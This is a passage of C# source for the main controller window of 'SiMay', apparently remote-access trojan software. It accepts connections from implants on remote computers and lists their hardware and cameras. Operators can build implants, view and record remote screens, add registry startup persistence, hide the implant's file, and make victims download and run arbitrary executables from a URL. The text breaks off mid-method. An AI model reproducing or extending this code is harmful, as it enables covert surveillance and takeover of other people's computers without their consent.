using SiMay.Basic;
using SiMay.Core;
using SiMay.Core.Enums;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.Net.SessionProvider;
using SiMay.Net.SessionProvider.Notify;
using SiMay.Net.SessionProvider.SessionBased;
using SiMay.RemoteMonitor.ControlSource;
using SiMay.RemoteMonitor.Entitys;
using SiMay.RemoteMonitor.Enums;
using SiMay.RemoteMonitor.Extensions;
using SiMay.RemoteMonitor.Notify;
using SiMay.RemoteMonitor.Properties;
using SiMay.RemoteMonitor.UserControls;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SiMay.RemoteMonitor.MainForm
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }
        private const int SHUTDOWN = 0;
        private const int REBOOT = 1;
        private const int REG_ACTION = 2;
        private const int REG_CANCEL_Action = 3;
        private const int ATTRIB_HIDE = 4;
        private const int ATTRIB_SHOW = 5;
        private const int UNSTALL = 6;

        private bool _isRun = true;
        private int _connect_count = 0;
        private int _desktopViewHeight = 150;
        private int _desktopViewWidth = 250;
        private int _deskrefreshTimeSpan = 1500;
        private long _sendTransferredBytes = 0;
        private long _receiveTransferredBytes = 0;


        private System.Timers.Timer _timer;
        private Color _closeScreenColor = Color.FromArgb(127, 175, 219);
        private ImageList _imgList;
        private ResetPool _resetPool;
        private SessionProvider _sessionProvider;
        private List<SessionSyncContext> _syncContexts = new List<SessionSyncContext>();
        private PacketModelBinder<SessionHandler> _handlerBinder = new PacketModelBinder<SessionHandler>();
        private void MainForm_Load(object sender, EventArgs e)
        {
            this.OnLoadConfiguration();
            this.InitTcpServerChannel();
        }

        /// <summary>
        /// 加载配置信息，及创建主控窗体
        /// </summary>
        private void OnLoadConfiguration()
        {
            this.Text = "SiMay远程监控管理系统-IOASJHD 正式版_" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Version.ToString();

            bool maximized;
            if (bool.TryParse(AppConfiguration.WindowMaximize, out maximized))
            {
                if (maximized)
                    this.WindowState = FormWindowState.Maximized;
            }

            this._imgList = new ImageList();
            this._imgList.Images.Add("ok", Resources.ok);
            this._imgList.Images.Add("error", Resources.erro);

            //计算实时上下传输流量
            this._timer = new System.Timers.Timer();
            this._timer.Interval = 1000;
            this._timer.Elapsed += (a, b) =>
            {
                if (!_isRun)
                {
                    _timer.Stop();
                    _timer.Dispose();
                    return;
                }

                this.BeginInvoke(new Action(() =>
                {
                    this.strdownflow.Text = (this._receiveTransferredBytes / (float)1024).ToString("0.00");
                    this._receiveTransferredBytes = 0;

                    this.struflow.Text = (this._sendTransferredBytes / (float)1024).ToString("0.00");
                    this._sendTransferredBytes = 0;
                }));

            };
            this._timer.Start();

            if (!int.TryParse(AppConfiguration.DesktopViewHeight, out this._desktopViewHeight))
                this._desktopViewHeight = 220;

            if (!int.TryParse(AppConfiguration.DesktopViewWidth, out this._desktopViewWidth))
                this._desktopViewHeight = 280;

            if (!int.TryParse(AppConfiguration.DesktopRefreshTimeSpan, out this._deskrefreshTimeSpan))
                this._deskrefreshTimeSpan = 1500;

            this.columntrackBar.Value = this._desktopViewHeight;
            this.rowtrackBar.Value = this._desktopViewWidth;
            this.row.Text = rowtrackBar.Value.ToString();
            this.column.Text = columntrackBar.Value.ToString();
            this.deskrefreshTimeSpan.Value = _deskrefreshTimeSpan;
            this.splitContainer2.SplitterDistance = (splitContainer2.Width / 4);

            this.logList.SmallImageList = _imgList;
            this.logList.Columns.Add("发生时间", 150);
            this.logList.Columns.Add("发生事件", 1000);

            string[] columnsTitle = new string[]
            {
                "IP地址",
                "计算机名",
                "操作系统",
                "处理器信息",
                "核心数量",
                "运行内存",
                "系统账户",
                "摄像设备",
                "录音设备",
                "播放设备",
                "备注信息",
                "服务版本",
                "启动时间"
            };

            for (int i = 0; i < columnsTitle.Length; i++)
                this.onlineList.Columns.Insert(i, columnsTitle[i], 150);

            this._resetPool = new ResetPool(_syncContexts);

            var controls = SysUtil.ControlTypes.OrderByDescending(x => x.Rank).ToList();
            controls.ForEach(c =>
            {
                var stripMenu = new UToolStripMenuItem(c.DisplayName, c.CtrlType);
                stripMenu.Click += StripMenu_Click;
                this.CmdContext.Items.Insert(0, stripMenu);

                var stripButton = new UToolStripButton(c.DisplayName, SysUtil.GetResourceImageByName(c.ResourceName), c.CtrlType);
                stripButton.Click += StripButton_Click;
                this.toolStrip1.Items.Insert(3, stripButton);
            });

            bool isLock;
            if (bool.TryParse(AppConfiguration.WindowsIsLock, out isLock))
            {
                if (isLock) //锁住主控界面
                    LockWindow();
            }
        }

        /// <summary>
        /// 初始化通信库
        /// </summary>
        private void InitTcpServerChannel()
        {
            int sessionMode;
            if (!int.TryParse(AppConfiguration.SessionMode, out sessionMode))
                sessionMode = 0;

            string ip = sessionMode == 0 ? AppConfiguration.IPAddress : AppConfiguration.ServiceIPAddress;
            int port = int.Parse(sessionMode == 0 ? AppConfiguration.Port : AppConfiguration.ServicePort);

            int maxconnectCount;
            if (!int.TryParse(AppConfiguration.MaxConnectCount, out maxconnectCount))
                maxconnectCount = 0;

            if (port <= 0)
                port = 5200;

            if (maxconnectCount <= 0)
                maxconnectCount = 100000;

            this.stripHost.Text = ip;
            this.stripPort.Text = port.ToString();

            var ipe = new IPEndPoint(IPAddress.Parse(ip), port);
            var options = new SessionProviderOptions()
            {
                ServiceIPEndPoint = ipe,
                PendingConnectionBacklog = maxconnectCount,
                AccessKey = long.Parse(AppConfiguration.AccessKey)
            };

            var mode = int.Parse(AppConfiguration.SessionMode);
            if (mode == 0)
            {
                options.SessionProviderType = SessionProviderType.TcpServiceSession;
                _sessionProvider = SessionProviderFactory.CreateTcpSessionProvider(options, OnNotifyProc);
                try
                {
                    _sessionProvider.StartSerivce();
                    this.WriteRuninglog("SiMay远程监控管理系统端口 " + port.ToString() + " 监听成功!", "ok");
                }
                catch (Exception ex)
                {
                    LogHelper.WriteErrorByCurrentMethod(ex);
                    this.WriteRuninglog("SiMay远程监控管理系统端口 " + port.ToString() + " 启动失败,请检查配置!", "error");
                }
            }
            else
            {
                options.SessionProviderType = SessionProviderType.TcpProxySession;

                _sessionProvider = SessionProviderFactory.CreateProxySessionProvider(options, OnNotifyProc, OnProxyNotify);
                try
                {
                    _sessionProvider.StartSerivce();
                    this.WriteRuninglog("SiMay远程监控管理系统初始化成功!", "ok");
                }
                catch (Exception ex)
                {
                    LogHelper.WriteErrorByCurrentMethod(ex);
                    this.WriteRuninglog("SiMay远程监控管理系统发生错误，请检查配置!", "error");
                }
            }
        }


        /// <summary>
        /// 代理协议事件
        /// </summary>
        /// <param name="notify"></param>
        private void OnProxyNotify(ProxyNotify notify)
        {
            switch (notify)
            {
                case ProxyNotify.AccessKeyWrong:
                    MessageBox.Show("AccessKey错误,与会话服务器的连接自动关闭!", "提示", 0, MessageBoxIcon.Exclamation);
                    break;
                case ProxyNotify.LogOut:
                    if (MessageBox.Show("已有其他控制端连接服务器,本次连接已自动关闭,是否重新连接?", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly) == DialogResult.OK)
                    {
                        _sessionProvider.StartSerivce();
                    }
                    break;
            }
        }

        /// <summary>
        /// 通信完成消息处理方法
        /// </summary>
        /// <param name="session"></param>
        /// <param name="notify"></param>
        public void OnNotifyProc(SessionCompletedNotify notify, SessionHandler session)
        {
            if (!_isRun)
                return;

            this.Invoke(new Action(() =>
            {
                switch (notify)
                {
                    case SessionCompletedNotify.OnConnected:
                        this.InitSessionAppTokens(session);
                        break;
                    case SessionCompletedNotify.OnSend:
                        this.OnTransmit(session);
                        break;
                    case SessionCompletedNotify.OnRecv:
                        this.OnReceive(session);
                        break;
                    case SessionCompletedNotify.OnReceived:
                        this.OnReceiveComplete(session);
                        break;
                    case SessionCompletedNotify.OnClosed:
                        this.OnClosed(session);
                        break;
                }
            }));
        }

        /// <summary>
        /// 建议分析代码从此处开始，服务端连接初始化事件
        /// </summary>
        /// <param name="session"></param>
        private void InitSessionAppTokens(SessionHandler session)
        {
            //先分配好工作类型，等待工作指令分配新的工作类型
            session.AppTokens = new object[2]
            {
                ConnectionWorkType.NONE,//未经过验证的连接
                null
            };
        }
        //耗时操作会导致接收性能严重降低
        public void OnTransmit(SessionHandler session)
            => this._sendTransferredBytes += session.SendTransferredBytes;

        public void OnReceive(SessionHandler session)
            => this._receiveTransferredBytes += session.ReceiveTransferredBytes;

        public void OnReceiveComplete(SessionHandler session)
        {
            // Tokens参数说明
            // [0]为该连接工作类型，MainWork为主连接或者未分配工作的连接
            // [1]如果连接为Work类型，则是工作窗口的消息接收处理方法，否则是应用参数
            object[] tokens = session.AppTokens;
            var sessionWorkType = (ConnectionWorkType)tokens[SysConstants.INDEX_WORKTYPE];

            if (sessionWorkType == ConnectionWorkType.WORKCON)
            {
                //消息传给消息提供器,由提供器提供消息给所在窗口进行处理
                ((MessageAdapter)tokens[SysConstants.INDEX_WORKER]).OnSessionNotify(session, SessionNotifyType.Message);
            }
            else if (sessionWorkType == ConnectionWorkType.MAINCON)
                _handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
            else if (sessionWorkType == ConnectionWorkType.NONE) //未经过验证的连接的消息只能进入该方法块处理，连接密码验证正确才能正式处理消息
            {
                switch (session.CompletedBuffer.GetMessageHead())
                {
                    case MessageHead.C_GLOBAL_CONNECT://连接确认包
                        this.ValiditySession(session);
                        break;
                    default://接收到其他数据包的处理
                        session.SessionClose();//伪造包,断开连接
                        break;
                }
            }
        }

        /// <summary>
        /// 创建工作窗口
        /// </summary>
        /// <param name="type"></param>
        /// <param name="session"></param>
        /// <param name="identifyId"></param>
        [PacketHandler(MessageHead.C_MAIN_OPEN_DLG)]
        public void OnOpenTaskDialog(SessionHandler session)
        {
            var openControl = session.CompletedBuffer.GetMessageEntity<OpenDialogPack>();
            string ctrlKey = openControl.ServiceKey;
            string identifyId = openControl.IdentifyId;
            //查找离线任务队列,如果有对应的任务则继续工作
            var task = _resetPool.FindTask(identifyId);
            if (task != null)
            {
                //再发出重连命令后，如果使用者主动关闭任务窗口将不再建立连接
                if (task.Adapter.WindowClosed)
                {
                    //通知远程释放资源
                    byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_GLOBAL_ONCLOSE);
                    session.SendAsync(data);
                    return;
                }

                //将消息提供器与会话关联
                var tokens = session.AppTokens;
                tokens[SysConstants.INDEX_WORKTYPE] = ConnectionWorkType.WORKCON;
                tokens[SysConstants.INDEX_WORKER] = task.Adapter;
                task.Adapter.Session = session;
                task.Adapter.ContinueTask();//继续任务

                _resetPool.RemoveTask(identifyId);
            }
            else
            {
                //关联一个消息提供器
                var adapter = new MessageAdapter(session, identifyId);
                var context = SysUtil.ControlTypes.Where(x => x.ControlKey.Equals(ctrlKey)).FirstOrDefault();
                if (context != null)
                {
                    var constructor = context.CtrlType.GetConstructor(new Type[] { typeof(MessageAdapter) });
                    if (constructor != null)
                    {
                        IControlSource ctrlSource = (IControlSource)Activator.CreateInstance(context.CtrlType, adapter);
                        ctrlSource.Action();
                    }
                    else
                        throw new Exception(context.CtrlType.FullName + " constructor need at least one message adapter!");
                }
                else
                {
                    session.SessionClose();
                    LogHelper.WriteErrorByCurrentMethod("A working connection was closed because the control whose controlkey is :{0} could not be found!".FormatTo(ctrlKey));
                    return;
                }
                session.AppTokens[SysConstants.INDEX_WORKTYPE] = ConnectionWorkType.WORKCON;
                session.AppTokens[SysConstants.INDEX_WORKER] = adapter;
            }
        }

        /// <summary>
        /// 确认连接包
        /// </summary>
        /// <param name="session"></param>
        private void ValiditySession(SessionHandler session)
        {
            long accessKey = BitConverter.ToInt64(session.CompletedBuffer.GetMessageBody(), 0);
            if (accessKey != int.Parse(AppConfiguration.ConnectPassWord))
            {
                session.SessionClose();
                return;
            }
            else
            {
                //连接密码验证通过，设置成为主连接，正式接收处理数据包
                session.AppTokens[SysConstants.INDEX_WORKTYPE] = ConnectionWorkType.MAINCON;

                //告诉服务端一切就绪
                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_GLOBAL_OK);
                session.SendAsync(data);
            }
        }

        /// <summary>
        /// 创建桌面记录任务
        /// </summary>
        /// <param name="session"></param>
        [PacketHandler(MessageHead.C_MAIN_SCREEN_RECORD_OPEN)]
        public void OnCreateScreenRecordTask(SessionHandler session)
        {
            string macName = session.CompletedBuffer.GetMessageBody().ToUnicodeString();
            var syncContext = session.AppTokens[SysConstants.INDEX_WORKER] as SessionSyncContext;
            syncContext.RecordScreenIsAction = true;//开启
            syncContext.MachineName = macName;//标识名(用计算机名作为唯一标识)

            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SCREEN_RECORD_GETIMG);
            session.SendAsync(data);
        }

        /// <summary>
        /// 储存桌面记录信息
        /// </summary>
        /// <param name="session"></param>
        [PacketHandler(MessageHead.C_MAIN_SCREEN_RECORD_IMG)]
        public void SaveScreenRecordImg(SessionHandler session)
        {
            var syncContext = session.AppTokens[SysConstants.INDEX_WORKER] as SessionSyncContext;
            bool status = syncContext.RecordScreenIsAction;
            string macName = syncContext.MachineName;

            if (!Directory.Exists("screenRecord\\" + macName))
                Directory.CreateDirectory("screenRecord\\" + macName);

            using (var ms = new MemoryStream(session.CompletedBuffer.GetMessageBody()))
            {
                string fileName = Path.Combine(Environment.CurrentDirectory, "screenRecord", macName, DateTime.Now.ToFileTime() + ".png");
                Image img = Image.FromStream(ms);
                img.Save(fileName);
                img.Dispose();
            }

            if (status == false)
                return;

            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SCREEN_RECORD_GETIMG);
            session.SendAsync(data);
        }


        /// <summary>
        /// 显示桌面墙数据
        /// </summary>
        /// <param name="session"></param>
        [PacketHandler(MessageHead.C_MAIN_SCREENWALL_IMG)]
        public void PlayerDesktopImage(SessionHandler session)
        {
            var syncContext = session.AppTokens[SysConstants.INDEX_WORKER] as SessionSyncContext;
            if (syncContext.DesktopView == null)
                return;

            var view = syncContext.DesktopView;

            using (var ms = new MemoryStream(session.CompletedBuffer.GetMessageBody()))
                view.SetImage(Image.FromStream(ms));

            byte[] data = MessageHelper.CopyMessageHeadTo(
                MessageHead.S_MAIN_SCREENWALL_GETIMG, new DesktopViewGetFramePack()
                {
                    Height = view.Height,
                    Width = view.Width,
                    TimeSpan = _deskrefreshTimeSpan
                });

            session.SendAsync(data);
        }

        /// <summary>
        /// 创建桌面视图
        /// </summary>
        /// <param name="session"></param>
        [PacketHandler(MessageHead.C_MAIN_USERDESKTOP_CREATE)]
        public void OnCreateDesktopView(SessionHandler session)
        {
            var describePack = session.CompletedBuffer.GetMessageEntity<DesktopViewDescribePack>();

            var view = new UDesktopView(session)
            {
                Width = _desktopViewWidth,
                Height = _desktopViewHeight,
                Caption = describePack.MachineName + "(" + describePack.RemarkInformation + ")"
            };
            view.OnDoubleClickEvent += DesktopViewDbClick;

            this.desktopViewLayout.Controls.Add(view);

            session.AppTokens[SysConstants.INDEX_WORKTYPE] = ConnectionWorkType.MAINCON;

            var syncContext = session.AppTokens[SysConstants.INDEX_WORKER] as SessionSyncContext;
            syncContext.DesktopView = view;

            byte[] data = MessageHelper.CopyMessageHeadTo(
                MessageHead.S_MAIN_SCREENWALL_GETIMG, new DesktopViewGetFramePack()
                {
                    Height = view.Height,
                    Width = view.Width,
                    TimeSpan = _deskrefreshTimeSpan
                });

            session.SendAsync(data);
        }
        /// <summary>
        /// 从主控端移除桌面墙
        /// </summary>
        /// <param name="view"></param>
        private void DisposeDesktopView(UDesktopView view)
        {
            this.desktopViewLayout.Controls.Remove(view);
            view.OnDoubleClickEvent -= DesktopViewDbClick;
            view.Dispose();
        }

        /// <summary>
        /// 移除在线信息
        /// </summary>
        /// <param name="session"></param>
        private void OnClosed(SessionHandler session)
        {
            try
            {
                object[] arguments = session.AppTokens;
                var worktype = (ConnectionWorkType)arguments[SysConstants.INDEX_WORKTYPE];
                if (worktype == ConnectionWorkType.WORKCON)
                {
                    var adapter = arguments[SysConstants.INDEX_WORKER] as MessageAdapter;

                    if (adapter.WindowClosed)//如果是手动结束任务
                    {
                        //adapter.WindowClose();//关闭窗口
                        return;
                    }

                    adapter.TipText = "工作连接已断开,正在重新连接中....";
                    adapter.SessionClosed();

                    //非手动结束任务，将该任务扔到重连队列中
                    _resetPool.Put(new SuspendTaskContext()
                    {
                        DisconnectTime = DateTime.Now,
                        Adapter = adapter
                    });
                }
                else if (worktype == ConnectionWorkType.MAINCON)
                {
                    var syncContext = arguments[SysConstants.INDEX_WORKER] as SessionSyncContext;
                    _syncContexts.Remove(syncContext);
                    if (syncContext.DesktopView != null)                    //如果屏幕墙已开启,移除桌面墙
                        this.DisposeDesktopView(syncContext.DesktopView);
                    syncContext.OnSessionListItem.Remove();


                    this.WriteRuninglog("计算机:" + syncContext.MachineName + "(" + syncContext.Remark + ") -->已与控制端断开连接!", "error");
                    _connect_count--;
                    stripConnectedNum.Text = _connect_count.ToString();
                }
                else if (worktype == ConnectionWorkType.NONE)
                {
                    LogHelper.WriteErrorByCurrentMethod("NONE Session Close");
                }
            }
            catch (Exception ex)
            {
                LogHelper.WriteErrorByCurrentMethod(ex);
            }
        }




        /// <summary>
        /// 添加用户信息到上线列表，并根据用户信息无人值守打开任务
        /// </summary>
        /// <param name="session"></param>
        [PacketHandler(MessageHead.C_MAIN_LOGIN)]
        public void LoginHandler(SessionHandler session)
        {
            try
            {
                var login = session.CompletedBuffer.GetMessageEntity<LoginPack>();
                var syncContext = new SessionSyncContext()
                {
                    IPv4 = login.IPV4,
                    MachineName = login.MachineName,
                    Remark = login.Remark,
                    CpuInfo = login.ProcessorInfo,
                    CoreCount = login.ProcessorCount,
                    MemroySize = login.MemorySize,
                    StarupDateTime = login.StartRunTime,
                    Version = login.ServiceVison,
                    AdminName = login.UserName,
                    OSVersion = login.OSVersion,
                    IsCameraExist = login.ExistCameraDevice,
                    IsRecordExist = login.ExitsRecordDevice,
                    IsPlayerExist = login.ExitsPlayerDevice,
                    IsOpenScreenRecord = login.OpenScreenRecord,
                    IsOpenScreenView = login.OpenScreenWall,
                    IdentifyId = login.IdentifyId,
                    RecordScreenIsAction = false,//桌面记录状态
                    RecordScreenHeight = login.RecordHeight,//用于桌面记录的高
                    RecordScreenWidth = login.RecordWidth,//用于桌面记录宽
                    RecordScreenSpanTime = login.RecordSpanTime,
                    Session = session
                };

                _syncContexts.Add(syncContext);
                var listItem = new USessionListItem(syncContext);
                syncContext.OnSessionListItem = listItem;
                session.AppTokens[SysConstants.INDEX_WORKER] = syncContext;
                onlineList.Items.Add(listItem);

                //是否开启桌面视图
                if (syncContext.IsOpenScreenView != true)
                    listItem.BackColor = _closeScreenColor;
                else
                {
                    byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_DESKTOPVIEW, new byte[] { 0 });//强制创建视图
                    session.SendAsync(data);
                }

                //是否桌面记录
                if (syncContext.IsOpenScreenRecord)
                {
                    byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SCREEN_RECORD_OPEN,
                            new DesktopRecordGetFramePack()
                            {
                                Height = syncContext.RecordScreenHeight,
                                Width = syncContext.RecordScreenWidth,
                                TimeSpan = syncContext.RecordScreenSpanTime
                            });
                    session.SendAsync(data);
                }

                _connect_count++;
                stripConnectedNum.Text = _connect_count.ToString();

                Win32Api.FlashWindow(this.Handle, true); //上线任务栏图标闪烁

                this.WriteRuninglog("计算机:" + syncContext.MachineName + "(" + syncContext.Remark + ") -->已连接控制端!", "ok");
            }
            catch (Exception ex)
            {
                LogHelper.WriteErrorByCurrentMethod(ex);
                //可能是旧版本上线包
            }
        }

        /// <summary>
        /// 向已选择的桌面墙发送命令
        /// </summary>
        /// <param name="data"></param>
        /// <param name="isBock"></param>
        /// <returns></returns>
        private List<UDesktopView> SelectedDesktopViewSend(byte[] data)
        {
            var selectedViews = new List<UDesktopView>();
            foreach (UDesktopView item in desktopViewLayout.Controls)
            {
                if (item.Checked)
                {
                    item.Session.SendAsync(data);
                    selectedViews.Add(item);
                    item.Checked = false;
                }
            }
            return selectedViews;
        }

        /// <summary>
        /// 向选择了的列表发送命令
        /// </summary>
        /// <param name="data"></param>
        /// <returns></returns>
        private List<USessionListItem> SelectedSend(byte[] data)
        {
            var selectedItems = new List<USessionListItem>();

            if (onlineList.SelectedItems.Count != 0)
            {
                var SelectItem = onlineList.SelectedItems;
                for (int i = 0; i < SelectItem.Count; i++)
                    onlineList.Items[SelectItem[i].Index].Checked = true;

                foreach (USessionListItem item in onlineList.Items)
                {
                    if (item.Checked)
                    {
                        if (data != null)
                            item.SyncContext.Session.SendAsync(data);

                        selectedItems.Add(item);
                        item.Checked = false;

                    }
                }
            }

            return selectedItems;
        }

        private void LockWindow()
        {
            this.Hide();
            AppConfiguration.WindowsIsLock = "true";
            LockWindowsForm form = new LockWindowsForm();
            form.ShowDialog();
            this.Show();
        }

        private void StripButton_Click(object sender, EventArgs e)
        {
            var ustripbtn = sender as UToolStripButton;
            string key = ustripbtn.CtrlType.GetControlKey();
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_ACTIVATE_CTRLSERVICE, key);
            this.SelectedDesktopViewSend(data);
        }

        private void StripMenu_Click(object sender, EventArgs e)
        {
            var ustripbtn = sender as UToolStripMenuItem;
            string key = ustripbtn.CtrlType.GetControlKey();
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_ACTIVATE_CTRLSERVICE, key);
            this.SelectedSend(data);
        }

        /// <summary>
        /// 双击屏幕墙执行一些任务
        /// </summary>
        /// <param name="session"></param>
        private void DesktopViewDbClick(SessionHandler session)
        {
            byte[] data = MessageHelper.CopyMessageHeadTo(
                MessageHead.S_MAIN_ACTIVATE_CTRLSERVICE,
                AppConfiguration.DbClickViewExc);

            session.SendAsync(data);
        }

        /// <summary>
        /// 输出日志
        /// </summary>
        /// <param name="log"></param>
        /// <param name="key"></param>
        private void WriteRuninglog(string log, string key = "ok")
        {
            ListViewItem logItem = new ListViewItem();
            logItem.ImageKey = key;
            logItem.Text = DateTime.Now.ToString();
            logItem.SubItems.Add(log);

            LogHelper.WriteLog(log, "OnRun.log");

            if (logList.Items.Count >= 1)
                logList.Items.Insert(1, logItem);
            else
                logList.Items.Insert(0, logItem);
        }

        /// <summary>
        /// 清除日志
        /// </summary>
        private void Clearlogs()
        {
            int i = 0;
            foreach (ListViewItem item in logList.Items)
            {
                i++;
                if (i > 1)
                    item.Remove();
            }
        }

        private void SystemOption(object sender, EventArgs e)
        {
            AppSettingForm configForm = new AppSettingForm();
            configForm.ShowDialog();
        }

        private void CmdContext_Opening(object sender, CancelEventArgs e)
        {
            if (onlineList.SelectedItems.Count == 0)
                CmdContext.Enabled = false;
            else
                CmdContext.Enabled = true;
        }

        private void CreateService(object sender, EventArgs e)
        {
            BuilderServiceForm serviceBuilder = new BuilderServiceForm();
            serviceBuilder.ShowDialog();
        }

        private void RemoteShutdown(object sender, EventArgs e)
        {
            if (MessageBox.Show("确定关闭远程计算机吗?", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) != DialogResult.OK)
                return;
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SESSION, new byte[] { SHUTDOWN });
            SelectedSend(data);
        }

        private void RemoteReboot(object sender, EventArgs e)
        {
            if (MessageBox.Show("确定重启远程计算机吗?", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) != DialogResult.OK)
                return;
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SESSION, new byte[] { REBOOT });
            SelectedSend(data);
        }

        private void RemoteStartup(object sender, EventArgs e)
        {
            if (MessageBox.Show("该操作可能导致远程计算机安全软件警示，继续操作吗?", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) != DialogResult.OK)
                return;
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SESSION, new byte[] { REG_ACTION });
            SelectedSend(data);
        }

        private void RemoteUnStarup(object sender, EventArgs e)
        {
            if (MessageBox.Show("该操作可能导致远程计算机安全软件警示，继续操作吗?", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) != DialogResult.OK)
                return;
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SESSION, new byte[] { REG_CANCEL_Action });
            SelectedSend(data);
        }

        private void RemoteHideServiceFile(object sender, EventArgs e)
        {
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SESSION, new byte[] { ATTRIB_HIDE });
            SelectedSend(data);
        }

        private void ToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SESSION, new byte[] { ATTRIB_SHOW });
            SelectedSend(data);
        }

        private void UninstallService(object sender, EventArgs e)
        {
            if (MessageBox.Show("确定解除对该远程计算机的控制吗？", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) != DialogResult.OK)
                return;
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_SESSION, new byte[] { UNSTALL });
            SelectedSend(data);
        }

        private void ModifyRemark(object sender, EventArgs e)
        {
            EnterForm f = new EnterForm();
            f.Caption = "请输入备注名称";
            DialogResult result = f.ShowDialog();
            if (f.Value != "" && result == DialogResult.OK)
            {
                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_REMARK, f.Value);
                SelectedSend(data);
            }
        }

        private void CopyRuningLog(object sender, EventArgs e)
        {
            if (logList.SelectedItems.Count != 0)
            {
                Clipboard.SetText(logList.Items[logList.SelectedItems[0].Index].SubItems[1].Text);
            }
        }

        private void DeleteRuningLog(object sender, EventArgs e)
        {
            if (logList.SelectedItems.Count != 0)
            {
                int Index = logList.SelectedItems[0].Index;
                if (Index >= 1)
                    logList.Items[Index].Remove();
            }
        }

        private void OnlineList_OnSelected(object sender, EventArgs e)
        {
            foreach (ListViewItem item in onlineList.Items)
                item.Checked = true;
        }

        private void OnileList_OnUnSelected(object sender, EventArgs e)
        {
            foreach (ListViewItem item in onlineList.Items)
                item.Checked = false;
        }

        private void ClearRuningLog(object sender, EventArgs e)
        {
            this.Clearlogs();
        }

        private void SendMessageBox(object sender, EventArgs e)
        {
            NotifyMessageBoxForm dlg = new NotifyMessageBoxForm();
            DialogResult result = dlg.ShowDialog();
            if (result == System.Windows.Forms.DialogResult.OK)
            {
                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_MESSAGEBOX,
                    new MessagePack()
                    {
                        MessageTitle = dlg.MessageTitle,
                        MessageBody = dlg.MessageBody,
                        MessageIcon = (byte)dlg.MsgBoxIcon
                    });
                SelectedSend(data);
            }
        }

        private void statusToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (statusToolStripMenuItem.Checked == true)
            {
                statusToolStripMenuItem.Checked = false;
                statusStrip1.Visible = false;
            }
            else
            {
                statusToolStripMenuItem.Checked = true;
                statusStrip1.Visible = true;
            }
        }

        private void RemoteDownloadExecete(object sender, EventArgs e)
        {
            EnterForm input = new EnterForm();
            input.Caption = "可执行文件的下载地址!";
            DialogResult result = input.ShowDialog();
            if (input.Value != "" && result == DialogResult.OK)
            {
                if (input.Value.IndexOf("http://") == -1 && input.Value.IndexOf("https://") == -1)
                {
                    MessageBox.Show("输入的网址不合法", "提示", 0, MessageBoxIcon.Exclamation);
                    return;
                }

                byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_HTTPDOWNLOAD,
                    input.Value);
                SelectedSend(data);
            }
        }

        private void About(object sender, EventArgs e)
        {
            AboutForm dlg = new AboutForm();
            dlg.ShowDialog();
        }

        private void onlineToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.onlineToolStripMenuItem.Checked == true)
            {
                this.splitContainer1.Panel2Collapsed = true;
                this.onlineToolStripMenuItem.Checked = false;
            }
            else
            {
                this.splitContainer1.Panel2Collapsed = false;
                this.onlineToolStripMenuItem.Checked = true;
            }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_DESKTOPVIEW, new byte[] { 1 });
            var lis = SelectedSend(data);
            foreach (USessionListItem item in lis)
                item.BackColor = Color.Transparent;
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            byte[] data = MessageHelper.CopyMessageHeadTo(MessageHead.S_MAIN_USERDESKTOP_CLOSE);
            var lis = SelectedSend(data);

            foreach (USessionListItem item in lis)
            {
                SessionHandler Session = item.SyncContext.Session;

                var syncContext = Session.AppTokens[1] as SessionSyncContext;
                if (syncContext.DesktopView != null)
                {
                    DisposeDesktopView(syncContext.DesktopView);
                    syncContext.DesktopView = null;
                }

                item.BackColor = _closeScreenColor;
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (deskrefreshTimeSpan.Value < 300)
            {
                this.WriteRuninglog("设置未保存,刷新间隔不能小于300!", "error");
                return;
            }

            this._desktopViewHeight = columntrackBar.Value;
            this._desktopViewWidth = rowtrackBar.Value;

            AppConfiguration.DesktopViewHeight = _desktopViewHeight.ToString();
            AppConfiguration.DesktopViewWidth = _desktopViewWidth.ToString();
            AppConfiguration.DesktopRefreshTimeSpan = deskrefreshTimeSpan.Value.ToString();

